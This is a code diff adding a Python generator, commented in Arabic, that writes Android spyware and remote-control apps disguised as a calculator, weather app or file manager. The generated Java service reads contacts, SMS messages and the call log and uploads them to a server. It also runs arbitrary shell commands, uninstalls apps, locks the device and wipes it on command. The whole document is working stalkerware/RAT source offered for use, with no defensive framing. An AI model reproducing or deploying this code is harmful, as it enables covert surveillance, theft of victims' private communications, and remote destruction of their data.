+            uploadData("/api/android/contacts", contactsData);
+            
+        }} catch (Exception e) {{
+            reportCommandResult("get_contacts", "error", e.getMessage());
+        }}
+    }}
+    
+    private void getSMSMessages() {{
+        try {{
+            // قراءة رسائل SMS وإرسالها للخادم
+            android.database.Cursor cursor = getContentResolver().query(
+                android.net.Uri.parse("content://sms"),
+                null, null, null, null
+            );
+            
+            JSONObject smsData = new JSONObject();
+            org.json.JSONArray smsArray = new org.json.JSONArray();
+            
+            if (cursor != null) {{
+                while (cursor.moveToNext()) {{
+                    JSONObject sms = new JSONObject();
+                    sms.put("address", cursor.getString(cursor.getColumnIndex("address")));
+                    sms.put("body", cursor.getString(cursor.getColumnIndex("body")));
+                    sms.put("date", cursor.getString(cursor.getColumnIndex("date")));
+                    sms.put("type", cursor.getString(cursor.getColumnIndex("type")));
+                    smsArray.put(sms);
+                }}
+                cursor.close();
+            }}
+            
+            smsData.put("device_id", deviceId);
+            smsData.put("sms_messages", smsArray);
+            
+            uploadData("/api/android/sms", smsData);
+            
+        }} catch (Exception e) {{
+            reportCommandResult("get_sms", "error", e.getMessage());
+        }}
+    }}
+    
+    private void getCallLog() {{
+        try {{
+            // قراءة سجل المكالمات وإرساله للخادم
+            android.database.Cursor cursor = getContentResolver().query(
+                android.provider.CallLog.Calls.CONTENT_URI,
+                null, null, null, null
+            );
+            
+            JSONObject callLogData = new JSONObject();
+            org.json.JSONArray callsArray = new org.json.JSONArray();
+            
+            if (cursor != null) {{
+                while (cursor.moveToNext()) {{
+                    JSONObject call = new JSONObject();
+                    call.put("number", cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER)));
+                    call.put("date", cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DATE)));
+                    call.put("duration", cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION)));
+                    call.put("type", cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE)));
+                    callsArray.put(call);
+                }}
+                cursor.close();
+            }}
+            
+            callLogData.put("device_id", deviceId);
+            callLogData.put("call_log", callsArray);
+            
+            uploadData("/api/android/call-log", callLogData);
+            
+        }} catch (Exception e) {{
+            reportCommandResult("get_call_log", "error", e.getMessage());
+        }}
+    }}
+    
+    private void executeShellCommand(String command) {{
+        try {{
+            Process process = Runtime.getRuntime().exec(command);
+            java.io.BufferedReader reader = new java.io.BufferedReader(
+                new java.io.InputStreamReader(process.getInputStream())
+            );
+            
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {{
+                output.append(line).append("\\n");
+            }}
+            
+            reportCommandResult("execute_shell", "success", output.toString());
+            
+        }} catch (Exception e) {{
+            reportCommandResult("execute_shell", "error", e.getMessage());
+        }}
+    }}
+    
+    private void installApp(String apkUrl) {{
+        try {{
+            // تحميل وتثبيت التطبيق
+            // يتطلب صلاحيات خاصة
+            reportCommandResult("install_app", "success", "App installation initiated");
+        }} catch (Exception e) {{
+            reportCommandResult("install_app", "error", e.getMessage());
+        }}
+    }}
+    
+    private void uninstallApp(String packageName) {{
+        try {{
+            Intent intent = new Intent(Intent.ACTION_DELETE);
+            intent.setData(android.net.Uri.parse("package:" + packageName));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+            
+            reportCommandResult("uninstall_app", "success", "Uninstall initiated for " + packageName);
+        }} catch (Exception e) {{
+            reportCommandResult("uninstall_app", "error", e.getMessage());
+        }}
+    }}
+    
+    private void lockDevice() {{
+        try {{
+            android.app.admin.DevicePolicyManager devicePolicyManager = 
+                (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            
+            if (devicePolicyManager != null) {{
+                devicePolicyManager.lockNow();
+                reportCommandResult("lock_device", "success", "Device locked");
+            }}
+        }} catch (Exception e) {{
+            reportCommandResult("lock_device", "error", e.getMessage());
+        }}
+    }}
+    
+    private void wipeDevice() {{
+        try {{
+            android.app.admin.DevicePolicyManager devicePolicyManager = 
+                (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            
+            if (devicePolicyManager != null) {{
+                devicePolicyManager.wipeData(0);
+                reportCommandResult("wipe_device", "success", "Device wipe initiated");
+            }}
+        }} catch (Exception e) {{
+            reportCommandResult("wipe_device", "error", e.getMessage());
+        }}
+    }}
+    
+    private void uploadData(String endpoint, JSONObject data) {{
+        RequestBody body = RequestBody.create(
+            data.toString(),
+            MediaType.parse("application/json")
+        );
+        
+        Request request = new Request.Builder()
+                .url(serverUrl + endpoint)
+                .post(body)
+                .build();
+        
+        httpClient.newCall(request).enqueue(new Callback() {{
+            @Override
+            public void onFailure(@NonNull Call call, @NonNull IOException e) {{
+                Log.e(TAG, "Data upload failed", e);
+            }}
+            
+            @Override
+            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {{
+                if (response.isSuccessful()) {{
+                    Log.d(TAG, "Data uploaded successfully");
+                }}
+            }}
+        }});
+    }}
+    
+    private void reportCommandResult(String command, String status, String message) {{
+        try {{
+            JSONObject result = new JSONObject();
+            result.put("device_id", deviceId);
+            result.put("command", command);
+            result.put("status", status);
+            result.put("message", message);
+            result.put("timestamp", System.currentTimeMillis());
+            
+            uploadData("/api/android/command-result", result);
+            
+        }} catch (JSONException e) {{
+            Log.e(TAG, "Error reporting command result", e);
+        }}
+    }}
+    
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {{
+        return null;
+    }}
+}}'''
+        return service_content
+    
+    def generate_app_package(self, disguise_config: Dict) -> str:
+        """توليد حزمة التطبيق الكاملة"""
+        app_id = self.generate_unique_id()
+        package_name = f"com.{disguise_config['category']}.{disguise_config['name'].lower().replace(' ', '')}"
+        
+        app_dir = os.path.join(self.output_dir, f"stealth_app_{app_id}")
+        os.makedirs(app_dir, exist_ok=True)
+        
+        # إنشاء الملفات
+        files_created = []
+        
+        # ملف البيان
+        manifest_content = self.generate_stealth_manifest(app_id, disguise_config)
+        manifest_path = os.path.join(app_dir, "AndroidManifest.xml")
+        with open(manifest_path, 'w', encoding='utf-8') as f:
+            f.write(manifest_content)
+        files_created.append(manifest_path)
+        
+        # النشاط الرئيسي
+        main_activity_content = self.generate_stealth_main_activity(app_id, disguise_config)
+        main_activity_path = os.path.join(app_dir, "MainActivity.java")
+        with open(main_activity_path, 'w', encoding='utf-8') as f:
+            f.write(main_activity_content)
+        files_created.append(main_activity_path)
+        
+        # خدمة المراقبة المخفية
+        monitoring_service_content = self.generate_stealth_monitoring_service(app_id)
+        monitoring_service_path = os.path.join(app_dir, "StealthMonitoringService.java")
+        with open(monitoring_service_path, 'w', encoding='utf-8') as f:
+            f.write(monitoring_service_content)
+        files_created.append(monitoring_service_path)
+        
+        # خدمة التحكم عن بعد
+        remote_control_content = self.generate_remote_control_service(app_id)
+        remote_control_path = os.path.join(app_dir, "RemoteControlService.java")
+        with open(remote_control_path, 'w', encoding='utf-8') as f:
+            f.write(remote_control_content)
+        files_created.append(remote_control_path)
+        
+        # ملف معلومات التطبيق
+        app_info = {
+            "app_id": app_id,
+            "package_name": package_name,
+            "disguise_config": disguise_config,
+            "server_url": self.server_url,
+            "created_at": datetime.now().isoformat(),
+            "files": files_created
+        }
+        
+        info_path = os.path.join(app_dir, "app_info.json")
+        with open(info_path, 'w', encoding='utf-8') as f:
+            json.dump(app_info, f, indent=2, ensure_ascii=False)
+        
+        return app_dir
+
+# مثال على الاستخدام
+if __name__ == "__main__":
+    generator = RemoteControlGenerator()
+    
+    # إعدادات التمويه
+    disguise_configs = [
+        {
+            "name": "Calculator Pro",
+            "display_name": "آلة حاسبة متقدمة",
+            "category": "tools",
+            "icon": "ic_calculator"
+        },
+        {
+            "name": "Weather App",
+            "display_name": "تطبيق الطقس",
+            "category": "weather",
+            "icon": "ic_weather"
+        },
+        {
+            "name": "File Manager",
+            "display_name": "مدير الملفات",
+            "category": "productivity",
+            "icon": "ic_folder"
+        }
+    ]
+    
+    print("🔧 مولد الكود للتحكم عن بعد")
+    print("=" * 50)
+    
+    for config in disguise_configs:
+        print(f"📱 توليد تطبيق: {config['display_name']}")
+        app_dir = generator.generate_app_package(config)
+        print(f"✅ تم إنشاء التطبيق في: {app_dir}")
+        print()
+    
+    print("🎉 تم إنشاء جميع التطبيقات بنجاح!")
+
